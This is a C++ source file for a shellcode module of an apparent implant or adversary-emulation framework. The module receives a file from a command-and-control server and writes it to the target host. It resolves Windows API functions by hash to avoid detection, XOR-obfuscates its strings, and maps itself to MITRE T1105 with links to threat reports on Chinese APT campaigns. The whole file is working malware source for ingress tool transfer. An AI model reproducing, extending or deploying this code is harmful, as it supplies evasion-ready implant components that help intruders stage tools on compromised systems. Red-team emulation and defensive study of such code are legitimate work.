#include "module_registry.hpp"
#include "C2DownloadFile.hpp"
#include "fnv1a.hpp"
#include <al/import.hpp>

// Populates function pointers for use throughout shellcode
DWORD FetchFunctions(download_pointers* fp) {
    auto kernel32 = GM(L"KERNEL32.DLL", by_ror13);
    if (!kernel32) {
        return FAIL_GET_KERNEL32;
    }

    fp->fp_CreateFileA = GP(kernel32, CreateFileA, by_fnv1a);
    if (!(fp->fp_CreateFileA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CREATEFILEA;
    }

    fp->fp_WriteFile = GP(kernel32, WriteFile, by_fnv1a);
    if (!(fp->fp_WriteFile)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_WRITEFILEA;
    }

    fp->fp_CloseHandle = GP(kernel32, CloseHandle, by_fnv1a);
    if (!(fp->fp_CloseHandle)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE;
    }

    fp->fp_ExpandEnvironmentStringsA = GP(kernel32, ExpandEnvironmentStringsA, by_fnv1a);
    if (!(fp->fp_ExpandEnvironmentStringsA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_EXPANDENVIRONMENTSTRINGSA;
    }

    return ERROR_SUCCESS;
}

/*
 * HandleC2DownloadFile:
 *      About:
 *          Writes file to host.
 *      Result:
 *          File created on host.
 *      MITRE ATT&CK Techniques:
 *          T1105: Ingress Tool Transfer
 *      CTI:
 *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
 *          https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html
 */
void HandleC2DownloadFile(void* data, void* context, logger_ctx* log_ctx) {
    module_context_t* m_ctx = (module_context_t*)data;
    download_pointers* ctx = (download_pointers*)context;
    DWORD error_code;

    // Check for required data from C2
    if (m_ctx->argc == 0 || !m_ctx->argv[0] || !m_ctx->output || m_ctx->outputSize == 0) {
        AesLogger::LogError(log_ctx, "Invalid args or content"_xor);
        m_ctx->output = (char*)"Invalid args or content.";
        m_ctx->outputSize = strlen((char*)m_ctx->output);
        return;
    }

    const char* fileName = m_ctx->argv[0];
    const char* fileData = m_ctx->output;
    size_t fileSize = m_ctx->outputSize;

    AesLogger::LogInfo(log_ctx, "Performing file download to: %s"_xor, fileName);

    // Expand any environment variables in path
    char expandedPath[MAX_PATH + 2];
    DWORD expansionResult = ctx->fp_ExpandEnvironmentStringsA(fileName, expandedPath, MAX_PATH + 2);
    if (expansionResult == 0) {
        error_code = log_ctx->fp->fp_GetLastError();
        AesLogger::LogError(log_ctx, "Failed to expand environment variables in file path. ExpandEnvironmentStringsA error code: %d"_xor, error_code);
        m_ctx->output = (char*)"Failed to expand environment variables in file path.";
        m_ctx->outputSize = strlen((char*)m_ctx->output);
        return;
    }

    // Create file handle
    AesLogger::LogInfo(log_ctx, "Final destination path for download: %s"_xor, expandedPath);
    HANDLE hFile = ctx->fp_CreateFileA(expandedPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        error_code = log_ctx->fp->fp_GetLastError();
        AesLogger::LogError(log_ctx, "Failed to create file. Error code: %d"_xor, error_code);
        m_ctx->output = (char*)"Failed to create file.";
        m_ctx->outputSize = strlen((char*)m_ctx->output);
        ctx->fp_CloseHandle(hFile);
        return;
    }

    // Write data to file
    DWORD bytesWritten = 0;
    if(!ctx->fp_WriteFile(hFile, fileData, (DWORD)fileSize, &bytesWritten, NULL)) {
        error_code = log_ctx->fp->fp_GetLastError();
        AesLogger::LogError(log_ctx, "Failed to write to downloaded file. Error code: %d"_xor, error_code);
        m_ctx->output = (char*)"Failed to write file.";
        m_ctx->outputSize = strlen((char*)m_ctx->output);
        ctx->fp_CloseHandle(hFile);
        return;
    }

    // Close handle and return success.
    ctx->fp_CloseHandle(hFile);
    AesLogger::LogSuccess(log_ctx, "Successfully downloaded file."_xor);
    m_ctx->output = (char*)"File saved successfully.";
    m_ctx->outputSize = strlen(m_ctx->output);
    return;

}

DWORD RegisterModule_C2DownloadFile(sh_context* ctx, uint32_t module_id) {
    download_pointers* m_ctx = (download_pointers*)(ctx->fp.fp_malloc(sizeof(download_pointers)));
    if (!m_ctx) {
        AesLogger::LogError(ctx->log_ctx, "Failed to allocate memory for module with ID 0x%x."_xor, module_id);
        return CUSTOM_MODULE_C2_DOWNLOADFILE_FAIL_MALLOC_STRUCT;
    }

    DWORD result = FetchFunctions(m_ctx);
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(ctx->log_ctx, "Failed to fetch functions for module with ID 0x%x. Error code: %d"_xor, module_id, result);
        ctx->fp.fp_free(m_ctx);
        return CUSTOM_MODULE_C2_DOWNLOADFILE_FAIL_GET_POINTERS;
    }

    result = RegisterModule(ctx, module_id, HandleC2DownloadFile, m_ctx);
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(ctx->log_ctx, "Failed to register module ID 0x%x. Error code: %d"_xor, module_id, result);
        ctx->fp.fp_free(m_ctx);
        return CUSTOM_MODULE_C2_DOWNLOADFILE_FAIL_REGISTER_MODULE;
    }

    AesLogger::LogSuccess(ctx->log_ctx, "Successfully registered module 0x%x."_xor, module_id);

    return ERROR_SUCCESS;
}
